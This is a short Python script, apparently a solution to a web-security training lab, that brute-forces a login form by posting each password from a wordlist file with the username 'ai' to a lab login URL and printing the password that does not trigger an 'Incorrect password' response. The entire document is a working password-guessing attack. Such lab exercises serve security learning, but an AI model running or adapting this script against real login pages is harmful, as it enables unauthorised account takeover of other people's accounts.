import requests
import re

passwords=open("pspasswords.txt","r")

for i in passwords:
    data = {'username': "ai", 'password': i.strip() }
    respuesta = requests.post('https://0a5c00130346041581310281005c0059.web-security-academy.net/login', data)
    coincidencia1 = re.findall("Incorrect password",respuesta.text)
    if coincidencia1 == []:
    	print("Passowrdo encontrado: "+i.strip())

